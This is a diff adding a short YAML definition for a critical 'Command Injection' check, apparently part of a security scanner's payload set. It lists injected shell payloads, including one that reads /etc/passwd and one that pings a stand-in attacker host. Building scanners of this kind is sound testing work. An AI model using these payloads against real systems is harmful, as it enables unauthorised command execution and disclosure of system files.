@@ -1,0 +1,9 @@
+name: "Command Injection"
+type: "command_injection1"
+severity: "critical"
+payloads:
+  - ";id"
+  - "|ls -la"
+  - "`whoami`"
+  - "$(cat /etc/passwd)"
+  - "|| ping -c 5 attacker.com"
